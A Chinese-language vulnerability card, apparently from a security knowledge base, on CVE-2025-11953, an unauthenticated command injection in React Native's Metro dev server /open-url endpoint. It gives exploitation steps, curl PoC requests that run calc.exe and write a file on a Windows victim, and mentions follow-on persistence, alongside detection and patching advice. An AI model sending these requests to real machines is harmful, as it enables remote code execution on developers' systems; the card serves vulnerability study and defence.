---
id: web-nodejs-react-native-metro-open-url-command-injection
title: React Native CLI Metro /open-url 端点命令注入 RCE（CVE-2025-11953）
type: scenario
domain: web
path: web/nodejs
technique: node-open-url-command-injection
aliases:
- CVE-2025-11953
- React Native CLI 远程代码执行
- Metro /open-url 命令注入
- cli-server-api open-url RCE
- React Native 开发服务器 8081 命令注入
tags:
- nodejs
- react-native
- metro
- command-injection
- open-url
- development-server
- cve-2025-11953
- windows
- rce
cve:
- CVE-2025-11953
severity: critical
confidence: medium
status: verified
affected_versions: '@react-native-community/cli-server-api 4.8.0 至 20.0.0-alpha.2（修复于 20.0.0）'
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V57
  verified_at: '2026-11-05T08:53:25+08:00'
  notes: 已对照原文与11张图核对（img01/10/11 + 8张base64内嵌图）：受影响组件与区间 4.8.0 至 20.0.0-alpha.2、修复 20.0.0 与原文一致；图10 Kali curl POST /open-url {"url":"calc.exe"} 后 Windows 弹出计算器，图11 Burp 中 {"url":"cmd /c echo abc > C:\Windows\Temp\poc.txt"} 返回 200，命令注入/RCE 已打通。卡内按合法 JSON 修正了原文 curl 引号错误并注明，合理。原文未给出反弹 shell/回显 PoC，卡内已注明。open 在 Windows 经 cmd.exe 解释元字符的机制为公开实现细节、与实测 calc.exe/cmd /c 行为一致。PoC未在本机执行；frontmatter无sources/source_url（全库惯例）。
---

## 一句话结论

React Native CLI 的 Metro 开发服务器暴露了 `/open-url` 端点，它把请求 JSON 中的 `url` 直接交给 Node.js 的 `open` 包打开；`open` 在 Windows 上经 `cmd.exe` 启动目标，攻击者向可达的 `:8081/open-url` 发送含命令的 URL 即可在开发者机器上以其权限执行任意命令（CVE-2025-11953，CVSS 9.8，影响 `@react-native-community/cli-server-api` 4.8.0 至 20.0.0-alpha.2）。

## 原理

- Metro 开发服务器（React Native CLI 项目默认在 8081 端口）为开发者工具提供 `/open-url` 接口，用于在浏览器/文件管理器中打开链接。请求体为 JSON，服务端取 `url` 字段后调用 Node.js `open` 包（原文环境为 `open@6.4.0`）打开该值。
- `open` 包在 Windows 上不是直接 `CreateProcess`，而是通过 `cmd.exe /c start ...` 一类 shell 调用间接启动目标；`cmd.exe` 会解释 `&`、`|`、重定向 `>` 等元字符，也会把可执行程序名或 `cmd /c ...` 形式的字符串当作命令。因此只要 `url` 未做协议/字符白名单，攻击者就能把命令拼进参数，实现操作系统命令注入。
- 服务端未校验 URL 协议（未限定 `http:`/`https:`）也未做转义；攻击者不需要认证，因为开发服务器本身没有认证机制，只依赖“仅本机可访问”这一隐含假设。
- 开发服务器可能绑定 `0.0.0.0`（原文指出默认可能如此），同网段/公共 Wi-Fi/配置不当的云主机均可访问 8081，绕过“仅回环”的假设；命令最终以运行 Metro 的开发者账户权限执行，等于控制开发环境（源码、令牌、构建产物）。
- 原文复现：`{"url":"calc.exe"}` 让目标弹出计算器，`{"url":"cmd /c echo abc > C:\\Windows\\Temp\\poc.txt"}` 返回 200 并在目标生成文件，证明不是“仅打开网页”而是任意命令执行。

## 触发条件

- 项目使用 `@react-native-community/cli-server-api` 4.8.0 至 20.0.0-alpha.2（修复于 20.0.0）；
- Metro 开发服务器正在运行，且 8081 端口对攻击者可达（绑定 0.0.0.0、防火墙放行、容器/云安全组暴露等）；
- 目标为 Windows（原文演示环境；其他平台是否可利用取决于 `open` 在该平台调用 shell 的实现）；
- 攻击者能向 `/open-url` 发送 POST JSON。

## 利用步骤

1. 扫描/识别开放的 Metro 端口（默认 8081），访问 `/status` 等端点或观察 React Native 开发页面确认。
2. 直接向 `/open-url` 发送 JSON：`{"url":"calc.exe"}` 验证命令执行；再换成写文件或回连命令。
3. 若网络受限，可通过 Burp 等代理转发请求（原文用 `-x http://127.0.0.1:8080`）。
4. 命令以开发者权限执行；可进一步读取环境变量/源码、写入启动项或建立持久化。

## PoC

```bash
# 弹计算器验证（原文 Windows 环境）
curl -X POST http://<victim-ip>:8081/open-url \
  -H "Content-Type: application/json" \
  -d '{"url":"calc.exe"}'

# 任意命令/写文件（原文 Burp 中发送，返回 200）
curl -X POST http://<victim-ip>:8081/open-url \
  -H "Content-Type: application/json" \
  -d '{"url":"cmd /c echo abc > C:\\Windows\\Temp\\poc.txt"}'
```

注意：JSON 中的反斜杠需转义；原文第一条 curl 的引号写法有误，实际应以合法 JSON 发送。原文未给出反弹 shell 或读取命令输出的 PoC。

## 变体与关联

- 同一“开发服务器/调试接口暴露 → 未授权 RCE”模式：[[pentest-initial-access-jdwp-exposed-jvm-debug-rce]]（暴露的 JVM 调试端口）。
- Node.js 生态中把用户输入交给 shell/`child_process` 的命令注入：[[web-nodejs-dokploy-compose-appname-stored-command-injection]]、[[web-nodejs-dokploy-destination-testconnection-rclone-command-injection]]。
- 变体：绑定 `0.0.0.0` 的 Metro/Hot reload 服务、Expo/其他封装 CLI 的同类 `open-url` 端点；即使 `open` 只打开 URL，也可结合自定义协议处理器或本地文件实现进一步利用。

## 检测与防御

- 检测：8081 端口出现来自非开发机的 `POST /open-url`；请求体含 `cmd`、`powershell`、`&`、`|`、`>` 等命令特征；Metro/node 进程派生出 `cmd.exe`、`calc.exe` 或异常子进程；开发者主机出现非预期文件写入。
- 修复：升级 `@react-native-community/cli` 及 `cli-server-api` 至 20.0.0 及以上（修复对 URL 的校验）；同步升级/移除危险的 `open@6.4.0` 依赖。
- 加固：启动 Metro 时加 `--host 127.0.0.1`，仅监听回环；防火墙/安全组禁止外部访问 8081；不要把开发服务器暴露到公共网络；定期 `npm audit`。
